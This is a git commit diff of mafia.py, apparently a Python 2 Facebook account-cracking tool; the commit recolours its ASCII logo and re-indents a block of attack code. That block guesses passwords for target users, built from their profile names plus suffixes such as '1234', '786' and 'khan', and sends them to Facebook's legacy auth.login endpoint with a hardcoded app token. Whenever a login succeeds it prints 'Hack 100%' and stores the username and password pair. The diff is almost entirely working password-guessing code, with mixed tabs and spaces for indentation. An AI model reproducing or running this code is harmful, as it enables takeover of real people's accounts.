ecb5539597f2dd200aac0373f4943b3a17991273
lovehacker <61407838+lovehackerAsif@users.noreply.github.com>
2020-04-13 13:13:40 +0500

    Update mafia.py

--- mafia.py
+++ mafia.py
@@ -51,12 +51,12 @@ def jalan(z):
 #Dev:love_hacker
 ##### LOGO #####
 logo = """
-\033[1;97m██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗
-\033[1;97m██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝
-\033[1;97m██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░
-\033[1;97m██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░
-\033[1;97m██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗
-\033[1;97m╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
+\033[1;91m██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗
+\033[1;91m██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝
+\033[1;91m██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░
+\033[1;91m██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░
+\033[1;91m██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗
+\033[1;91m╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
 \033[1;94m███╗░░░███╗░█████╗░███████╗██╗░█████╗░
 \033[1;94m████╗░████║██╔══██╗██╔════╝██║██╔══██╗
 \033[1;94m██╔████╔██║███████║█████╗░░██║███████║
@@ -337,94 +337,94 @@ def pilih_super():
 		        if 'access_token' in q:
 			        print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass3
 		                oks.append(user+pass3)
-			 a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-		         b = json.loads(a.text)
-                         pass4 = j['first_name'] + '1234'
-		         data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-	                 q = json.load(data)
-		         if 'access_token' in q:
-			         print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass4
-			         oks.append(user+pass4)
-		         a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-	                 b = json.loads(a.text)
-		         pass5 = b['first_name'] + '1234'
-			 data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-		         q = json.load(data)
-			 if 'access_token' in q:
-			         print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass5
-				 oks.append(user+pass5)
-	                 a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-                         b = json.loads(a.text)
-			 pass6 = j['first_name'] + '1235'
-			 data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-		         q = json.load(data)
-                         if 'access_token' in q:
-			         print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass6
-			         oks.append(user+pass6)
-			 a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-			 b = json.loads(a.text)
-		         pass7 = b['first_name'] + '12345'
-			 data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-			 q = json.load(data)
-			 if 'access_token' in q:
-	                         print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass7
-                                 oks.append(user+pass7)
-		         a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-	                 b = json.loads(a.text)
-		         pass8 = j['first_name'] + '786'
-	                 data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-		         q = json.load(data)
-		         if 'access_token' in q:
-			         print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass8
-			         oks.append(user+pass8)
-			 a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-	                 b = json.loads(a.text)
-			 pass9 = '786786'
-			 data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-		         q = json.load(data)
-		         if 'access_token' in q:
-				 print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass9
-				 oks.append(user+pass9)
-			 a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-	                 b = json.loads(a.text)
-		         pass10 = b['first_name'] + '786'
-	                 data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-	                 q = json.load(data)
-			 if 'access_token' in q:
-	                         print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass10
-	                         oks.append(user+pass10)
-	                 a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-                         b = json.loads(a.text)
-	                 pass11 = 'Pakistan'
-	                 data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-                         q = json.load(data)
-			 if 'access_token' in q:
-			         print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass11
-				 oks.append(user+pass11)
-                         a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-	                 b = json.loads(a.text)
-                         pass12 = j['last_name'] + '123'
-		         data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass12)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-                         q = json.load(data)
-		         if 'access_token' in q:
-			         print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass12
-                                 oks.append(user+pass12)
-		         a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-	                 b = json.loads(a.text)
-			 pass13 = b['last_name'] + '123'
-			 data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass13)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-		         q = json.load(data)
-			 if 'access_token' in q:
-			         print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass13
-		                 oks.append(user+pass13)
-		         a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-	                 b = json.loads(a.text)
-                         pass14 = j['first_name'] + 'khan'
-			 data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass14)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-			 q = json.load(data)
-			 if 'access_token' in q:
-			         print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass14
-                                 oks.append(user+pass14)
+			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+		        b = json.loads(a.text)
+                        pass4 = j['first_name'] + '1234'
+		        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+	                q = json.load(data)
+		        if 'access_token' in q:
+			        print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass4
+			        oks.append(user+pass4)
+		        a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+	                b = json.loads(a.text)
+		        pass5 = b['first_name'] + '1234'
+			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+		        q = json.load(data)
+			if 'access_token' in q:
+			        print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass5
+			        oks.append(user+pass5)
+	                a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+                        b = json.loads(a.text)
+		        pass6 = j['first_name'] + '1235'
+			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+		        q = json.load(data)
+                        if 'access_token' in q:
+			        print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass6
+			        oks.append(user+pass6)
+			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+			b = json.loads(a.text)
+		        pass7 = b['first_name'] + '12345'
+			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+			q = json.load(data)
+			if 'access_token' in q:
+	                        print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass7
+                                oks.append(user+pass7)
+		        a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+	                b = json.loads(a.text)
+		        pass8 = j['first_name'] + '786'
+	                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+		        q = json.load(data)
+		        if 'access_token' in q:
+			        print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass8
+			        oks.append(user+pass8)
+		        a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+	                b = json.loads(a.text)
+		        pass9 = '786786'
+		        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+		        q = json.load(data)
+		        if 'access_token' in q:
+			        print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass9
+			        oks.append(user+pass9)
+		        a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+	                b = json.loads(a.text)
+		        pass10 = b['first_name'] + '786'
+	                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+	                q = json.load(data)
+			if 'access_token' in q:
+	                        print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass10
+	                        oks.append(user+pass10)
+	                a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+                        b = json.loads(a.text)
+	                pass11 = 'Pakistan'
+	                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+                        q = json.load(data)
+			if 'access_token' in q:
+			        print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass11
+			        oks.append(user+pass11)
+                        a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+	                b = json.loads(a.text)
+                        pass12 = j['last_name'] + '123'
+		        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass12)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+                        q = json.load(data)
+		        if 'access_token' in q:
+			        print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass12
+                                oks.append(user+pass12)
+		        a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+	                b = json.loads(a.text)
+		        pass13 = b['last_name'] + '123'
+		        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass13)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+		        q = json.load(data)
+		        if 'access_token' in q:
+			        print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass13
+		                oks.append(user+pass13)
+		        a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+	                b = json.loads(a.text)
+                        pass14 = j['first_name'] + 'khan'
+			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass14)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+		        q = json.load(data)
+		        if 'access_token' in q:
+			        print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass14
+                                oks.append(user+pass14)
 																	
 															
 		except:
